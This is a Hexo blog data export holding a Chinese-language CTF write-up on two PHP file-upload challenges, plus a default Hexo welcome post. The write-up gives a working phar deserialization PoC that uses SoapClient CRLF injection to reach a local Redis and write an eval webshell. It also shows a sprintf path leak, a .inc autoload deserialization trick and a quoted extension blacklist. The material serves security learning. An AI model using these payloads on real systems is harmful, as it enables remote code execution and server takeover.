{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"XDSEC-HW-1","slug":"XDSEC-HW-1","date":"2023-11-18T10:30:30.000Z","updated":"2023-11-18T10:31:38.811Z","comments":true,"path":"2023/11/18/XDSEC-HW-1/","permalink":"http://example.com/2023/11/18/XDSEC-HW-1/","excerpt":"","text":"Fake_Upload（长文警告！！！长文警告！！！） 首先随便传一个正常的图片上去，确实能传成功，点击跳转页面发现file参数GET可控，所以随便写一个值 发现网页回显了一个坏掉的图片的icon，用Chrome的话直接f12看源码，可以找到file_get_contents(“111”)显示找不到，说明这里对file参数没做什么过滤，试试看&#x2F;etc&#x2F;passwd，我这边是没有回显的，感觉是没权限，不知道为啥writeup里可以看到 于是乎就试试别的路径，&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php或者show.php，都是可以读到的 index.php: 12345678910111213&lt;?phperror_reporting(0);include_once &#x27;class.php&#x27;;if (!empty($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123; $tmp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; if (is_uploaded_file($tmp_name)) &#123; $upload = new upload($tmp_name, $filename); $upload-&gt;uploadImage(); &#125;&#125; ?&gt; show.php: 123456789&lt;?phpinclude_once &#x27;class.php&#x27;;if (isset($_GET[&#x27;file&#x27;])) &#123; if($_GET[&#x27;file&#x27;]) header(&#x27;Content-type: image/jpeg;&#x27;); echo file_get_contents($_GET[&#x27;file&#x27;]);&#125; else &#123; die(&#x27;?&#x27;);&#125; 可以看到show.php，include一个’class.php’，不妨把它也读出来 class.php: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php// I deployed a redis service with a password you never knowclass upload&#123; public $check; public $tmp_name; public $filename; public function __construct($tmp_name, $filename) &#123; $this-&gt;check = new Check(); $this-&gt;filename = $filename; $this-&gt;tmp_name = $tmp_name; &#125; public function uploadImage() &#123; if ($this-&gt;check-&gt;CheckName($this-&gt;filename)) &#123; $filepath = &quot;uploads/&quot; . $this-&gt;filename; if (move_uploaded_file($this-&gt;tmp_name, $filepath)) &#123; echo &quot;Upload success! Check your file &lt;a href=\\&quot;show.php?file=&quot; . $filepath . &quot;\\&quot;&gt;here&lt;/a&gt;.\\n&quot;; &#125; else echo &quot;Upload fail!\\n&quot;; &#125; else die(&#x27;Dangerous file!&#x27;); &#125; public function __destruct() &#123; $filepath = __DIR__ . &quot;/uploads/&quot; . $this-&gt;filename; if (file_exists($filepath)) &#123; if (!$this-&gt;check-&gt;CheckContent($filepath)) &#123; @unlink($filepath); die(&#x27;Dangerous file!&#x27;); &#125; &#125; &#125;&#125;class Check&#123; public function CheckName($filename) &#123; $ext = pathinfo($filename, PATHINFO_EXTENSION); return in_array($ext, array(&#x27;jpg&#x27;, &#x27;png&#x27;), true); &#125; public function CheckContent($filename) &#123; if (!getimagesize($filename)) return false; if (preg_match(&quot;/php|&lt;\\?/i&quot;, file_get_contents($filename))) return false; else return true; &#125;&#125; 在class.php注释里他说部署了一个redis应用并设了密码，那就顺便读一下redis.conf 一般路径是&#x2F;etc&#x2F;redis&#x2F;redis.conf，读到之后CTRL+F搜关键词pass就可以了 1requirepass fd0a2283945caf801e374907e8c24da3 然后对每段代码进行一下说明 index.php先看index.php，在前端是没有任何过滤的，传了文件之后就是用$_FILES来获取文件内容，所以我们要知道$_FILES是什么 当客户端提交之后，会获得一个$_FILES数组 12345$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot; $_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) 可以看到index.php调用了’name’和’tmp_name’这两个参数，然后new了一个upload类并调用了uploadImage class.php所以我们把目光转向class.php，它定义了一个upload类，一共有三个属性，其中check属性是另一个类 那就先看看check类，check类有两个方法，一个是checkname，一个是checkcontent 12345public function CheckName($filename)&#123; $ext = pathinfo($filename, PATHINFO_EXTENSION); return in_array($ext, array(&#x27;jpg&#x27;, &#x27;png&#x27;), true);&#125; 通过pathinfo和PATHINFO_EXTENSION获取传入filename的后缀扩展名（很准 然后用in_array判断这后缀是否是’jpg’和’png’其中一个，如果是则返回1，不是则返回空 12345678public function CheckContent($filename) &#123; if (!getimagesize($filename)) return false; if (preg_match(&quot;/php|&lt;\\?/i&quot;, file_get_contents($filename))) return false; else return true; &#125; 用getimagesize判断是不是图片，preg_match查找传入文件的内容中是否含有php或者&lt;?，反斜杠用来转义 返回false就会die（（（ 然后我们再回到upload类，属性讲完，接下来一步步讲它的各种方法 首先是魔术方法_construct()，传入两个参数分别作为tmp_name和name属性的值，初始化类的作用 然后定义了一个uploadImage()方法，其中要讲的是move_uploaded_file move_uploaded_file(string $from, string $to): bool，将上传的文件移动到新位置 一般来说，在上传文件的时候，$from都是$tmp_name，然后把他移动到相应上传的位置，但是暂存文件名不会保留，照理来说这里好像是可以靠竞争上传打一个马进去，但是后面又让我有点疑惑 就是下一个魔术方法_destruct()，这个方法就是用checkcontent再检查了一遍上传文件的内容，如果检测到危险就会unlink上传的文件，unlink就是通过文件的路径删除该路径上的文件，@表示强制执行 而众所周知，_destruct一般在代码结束的时候才会执行，所以即使假设上传成功了一个马，但是它又会被检测之后删除，可以预见的是在_construct和_destruct之间有一个时间差，通过竞争可能可以在上一个_destruct还没执行好永久上传上一个想要的文件 show.php就提一下header()，实际上就是把请求的header修改成括号里传入的格式，这里是改了content-type，也就是说所有得到的内容都将通过jpg&#x2F;mpeg格式来展现 然后就是用file_get_contents()读取一个文件，这里没有做任何过滤或WAF，所以可以很轻松地实现任意文件读取 一些尝试首先我想试试能不能绕过pathinfo，一般来说是00截断，要是00截断不行那基本路就堵死了 用burp试了一下，果然直接寄掉，pathinfo应该也是直接读00截断之后的文件后缀的，php传不上去该怎么办呢 这个时候就会想到phar了，因为phar文件即使后缀为jpg等格式也能正常执行 因为上传了phar文件之后还需要用phar伪协议来实现反序列化，所以得考虑题目是否有一些常见的文件操作函数 而show.php中的file_get_contents正是我们所需要的文件操作函数，并且show.php还include了class.php 这就让一条无形的POP链串通了我们想要的反序列化实现类的魔术方法的操作 123456789101112131415161718&lt;?php class test&#123; public $name=&quot;qwq&quot;; function __destruct() &#123; echo $this-&gt;name; &#125;&#125;$a = new test();$a-&gt;name=&quot;phpinfo&quot;;$phartest=new phar(&#x27;phartest.phar&#x27;,0);//后缀名必须为phar$phartest-&gt;startBuffering();//开始缓冲 Phar 写操作$phartest-&gt;setMetadata($a);//自定义的meta-data存入manifest$phartest-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测$phartest-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);//添加要压缩的文件#签名自动生成$phartest-&gt;stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘?&gt; 可以用上面这段代码在本地进行一下生成phar的测试，记得php.ini的phar.readonly要设置成Off 看了点例题，发现传phar上去反序列化好像毫无用处，唯一能触发且有一点用的是_destruct，但那玩意也是真的没什么用啊，除了检查和unlink，好像就什么都干不了，是不是我脑洞还不够大呢？ 其实做题的时候我一直避着hint走，因为我不知道什么是soap，所以我查资料的时候是不带soap的，如果你也bing搜了phar ssrf redis，那么你可能会搜到这样一篇博客 https://blog.csdn.net/solitudi/article/details/110521104 由于其他的博客统统一眼就看出来不和此题目环境适配，所以这篇博客介绍的soap好歹是做题的转机 即便你像我一样不知道什么是soap，通过搜索和排除应该也能找到一丝线索，而事实证明确实方向是对的 Soap在php中，SoapClient是内置的一个类，用于向服务端通过SOAP协议进行通信，关于实际的原理我了解的也不是很深入，对于做题来说只要知道SoapClient有一个魔术方法__call()，如果能触发这个魔术方法，那么我们就能够触发一个POST请求来伪造服务端向redis请求服务(ssrf)，因为redis也不出网的 而众所周知，为了触发__call()，需要我们调用该类的一个未定义的函数，而class.php中正好就有这个条件 你可以通过以下代码尝试往你的vps用SoapClient的__call()方法发送一个POST请求 但是首先得在php.ini里把soap的扩展给打开，如果是windows会和php本体一起安装，linux要额外install一下 123&lt;?php$a=new SoapClient(null, array(&#x27;uri&#x27;=&gt;&#x27;bbb&#x27;,&#x27;location&#x27;=&gt;&#x27;vps-ip:port&#x27;));$a-&gt;unexisted(); 记得vps上要开监听 那么我们是一定要对POST内容有所控制的，不然就算发送了也没什么用（（（ 正好SoapClient可以控制User-Agent和URI，但注意写在php里的是user_agent对应Headers的User-Agent 那么我们就可以CRLF，控制POST请求中的内容，跟本地的redis进行通信然后往根目录里写shell 逻辑 redis服务仅在容器本地开放，并未映射到容器外 可传文件基本已经锁死是phar，题目给的类没什么用，用php内置SoapClinet类 phar反序列化需要file_get_contents(phar://)，反序列化后触发SOAP的__call，发送可控POST请求 使$this-&gt;check是SoapClient类 SoapClient伪造POST请求，把redis命令写入content（记得auth，本地测试 把得到的$this作为meta-data写入phar中 POC1234567891011121314151617181920&lt;?phpclass upload&#123; public $check; public $tmp_name; public $filename;&#125;$a = new upload();$poc=&quot;auth fd0a2283945caf801e374907e8c24da3\\r\\nflushall\\r\\nconfig set dir /var/www/html\\r\\nconfig set dbfilename shell.php\\r\\nset jex &#x27;&lt;?=eval(\\$_REQUEST[&#x27;cmd&#x27;]?&gt;&#x27;\\r\\nsave&quot;;$pop = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;bbb&#x27;,&#x27;user_agent&#x27;=&gt;&quot;jex\\r\\n&quot;.$poc.&quot;\\r\\njex&quot;, &#x27;location&#x27;=&gt;&#x27;http://127.0.0.1:6379&#x27;));$a-&gt;check=$pop;$phartest=new phar(&#x27;phar.phar&#x27;,0);//后缀名必须为phar$phartest-&gt;startBuffering();//开始缓冲 Phar 写操作$phartest-&gt;setMetadata($a);//自定义的meta-data存入manifest$phartest-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测$phartest-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);//添加要压缩的文件#签名自动生成$phartest-&gt;stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘rename(&quot;phar.phar&quot;,&quot;phar.jpg&quot;); 然后就是竞争上传的内容了^_^ 打竞争的时候传phar.jpg到公网映射的端口老是connection reset，问了才知道是被校园网拦了，但是如果在本地搭的docker的话应该没有这个问题⑧，所以我就直接往uploads&#x2F;里放了phar.jpg 本以为到这一步应该就可以很轻松地phar://uploads/phar.jpg然后写一个shell.php了，然而老天爷似乎给我开了个玩笑，事实是报错了，输得很彻底 我一开始以为是我phar生成脚本有问题，所以我就去writeup里搬了份一样的，结果还是不行，这就有点狗血了 后来和学长交流之后，学长告诉我php8+就不再支持phar:&#x2F;&#x2F;自动反序列化了，而事实证明确实如此，我用本地的8.2解释器确实是没法反序列化触发类的魔术方法，因此，我就去找是否有文档说明了这一点 结果是用bing搜关键词没搜到，官方文档看了php8的changelog疑似也没找到，最后还得用google才能找到… 参考： https://php.watch/versions/8.0/phar-stream-wrapper-unserialize 你可能会问：你说的很对，但是容器里的php是7.4又不是8+，为什么还会报错呢？？？ 这是个好问题，因为php8+虽然不支持phar:&#x2F;&#x2F;自动反序列化，然而这并不代表phar这个功能就被废除了，只要把phar.readonly设置成off，你还是能照样生成phar，使用它平常和jar类似的功能，可恰恰问题就出在这里 php8+用上述代码跑出来的phar文件和php8-跑出来的phar文件是不一样的，至于为什么会这样，我个人推测是有些默认参数发生了变化，比如自动反序列化的参数可能php8+就默认是关闭的而8-是开启的，不过我也没深究，总之用php7跑出来的phar再用phar:&#x2F;&#x2F;传参就没问题了，成功写入了shell.php，能随便写了那就想干嘛都可以了 —————————————————————————————————————————————————— hahaphp这题真的是牛魔酬宾，太搞了（（（路径写个”不告诉你”给我整不会了 访问映射端口11100直接403Forbidden，原来是可以直接访问upload.php，然后源码都给了（waf不知道给没给.. upload.php: 1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);include(&#x27;waf.php&#x27;);extract($_POST);$waf = new waf();if(isset($_POST[&#x27;submit&#x27;])) &#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123; echo &quot;There is something wrong:&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125;else&#123; $dst = &#x27;/var/www/html/不告诉你&#x27;; $fileinfo = array($_FILES[&quot;file&quot;][&quot;name&quot;],$dst); if (file_exists(&quot;$fileinfo[1]/$fileinfo[0]&quot;)) &#123; echo $fileinfo[0] . &quot; has already existed :)&quot;; &#125;else &#123; $waf-&gt;data=$fileinfo[0]; $waf-&gt;check(); move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;$fileinfo[1]/$fileinfo[0]&quot;); $msg=&quot;file name:%s&quot;; foreach($fileinfo as $key =&gt; $value)&#123; $msg = sprintf($msg, $value); &#125; echo $msg; &#125; &#125; &#125; echo &quot;&lt;/h4&gt;&quot;;?&gt; waf.php: 123456789101112131415161718&lt;?phpclass waf&#123; public $data; public function check() &#123; $meow = $this-&gt;data; $blacklist = array(&quot;php5&quot;,&quot;php&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;,&quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;,&quot;&#123;&quot;,&quot;&#125;&quot;, &quot;\\(&quot;, &quot;\\)&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;); foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $meow)) &#123; die(&quot;You hacker out&quot;); &#125; &#125; return $this-&gt;data; &#125;&#125; 但是如果给了源码还有必要再找路径吗？？？（（（直接就在源码里了啊，其实换成secret就行 然后就是关于php-sprintf的一些知识，不懂遂开搜，参考如下，写的比较全也比较好 https://blog.csdn.net/qq_34106499/article/details/104085265 当然读Official Manual也是可以的，就是我偷懒了 毕竟是一个上传的界面，就随便传点东西看看，传一张png，没回显文件地址，但是通过file name: 2.png直接显示在了页面的最上面，那么通过分析源码我们可以知道，其实是对文件名做了一个格式化字符串的替换，但是它多次一举，替换了一次%s之后还要再替换一次，那就直接把文件名改成%s就能触发下一次替换目录的操作了 ps：实际上我一开始没看源码，直接在bp里狂试，最后直接写个%s就弹地址了，或者%1$s也是可以的，就是很疑惑的是为什么这个路径是错的呢？？（指dockerfile路径和这个源码的路径不一样），我绞尽脑汁也没找到这个源码还有什么别的地方调用了当前地址，只能认为是路径没写好，因为后面还会用到所以这个问题挺重要的 拿到目录之后访问haha.php，发现什么都没有，那么就要想是不是有备份文件或者.git什么的了，不知道能不能扫出来，反正试个大概就有了，swp备份的话就是备份文件名前面有个点号要注意，.haha.php.swp这样子 然后vim -r haha.php.swp恢复一下源码，和haha.php的源码稍微有一点出入就是waf类不存在的uploadcheck()换成了实际存在的check()，说实话有点会让人想歪到__call()，但是也没什么内置类用就是了 haha.php: 12345678910111213141516&lt;?phperror_reporting(0);include(&#x27;../waf.php&#x27;);echo &quot;&lt;h4 align=&#x27;center&#x27;&gt;Hello&lt;/h4&gt;&quot;;$a=new waf();spl_autoload_register();if(isset($_COOKIE[&quot;filenames&quot;]))&#123; $a-&gt;data=$_COOKIE[&quot;filenames&quot;]; if(strlen($a-&gt;check()) &lt;= 8)&#123;$filenames=unserialize($_COOKIE[&quot;filenames&quot;]);&#125;&#125;else&#123; $filenames=&#x27;test.test&#x27;; file_put_contents($filenames,&#x27; test&#x27;);&#125;?&gt; 有个很可疑的函数调用，spl_autoload_register()，我的老规矩还是查民间博客，这个函数如果（）内未指定参数那么默认调用同文件夹下的所有类，可以用以下代码查看调用类的格式要求 1234&lt;?phpspl_autoload_register();echo spl_autoload_extensions(); 回显是.inc,.php，那么.inc是哪种文件呢？实际上.inc类文件是类C语言基本通用的include file（虽然php用的多），所以你可以将函数和类等声明放在里面，然后为其他的php文件供以调用 然后到waf.php中找是否墙了.inc，发现没墙，那么思路就很清晰了，找了一篇参考博客，下面讲一下思路 https://cloud.tencent.com/developer/article/1717668 传一个a.inc到目录下，里面可以写执行任意代码的php，比如&lt;?php phpinfo();?&gt; 对xxx.inc后缀名前面的xxx定义成一个类，我这里是a就是定义一个名为a的类 对于a这个类属性和方法什么都不要写，直接序列化echo输出，一会要传cookie反序列化 用hackbar传cookie值，反序列化之后直接就会调用a.inc里面的函数 一些问题首先文件上传路径有误，上传到/不告诉你真的是有点幽默了，改了之后才能通 然后就是对传cookie的filenames的长度有限制，小于等于8，但是几乎最小的类的序列化都有12的长度 O:1:&quot;a&quot;:0:&#123;&#125;，但是似乎O:1:&quot;a&quot;:就可以了，虽然php8.2会报错但是php7.4不会（php8+又输）:sob: —————————————————————————————————————————————————— 总结让我对upload类题目有了更深的理解，只能说好题好题，玩的很开心，就是做题体验有时有点糟 但是纠错研究的感觉也还是挺有意思的，特别是php版本带来的不同让我印象深刻:smile: phar,soap,spl_auto_register等都是新东西，这下真是强壮web人了 鸣谢xlccccc","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"Hello World","slug":"hello-world","date":"2023-11-11T11:09:09.094Z","updated":"2023-11-11T11:09:09.094Z","comments":true,"path":"2023/11/11/hello-world/","permalink":"http://example.com/2023/11/11/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]}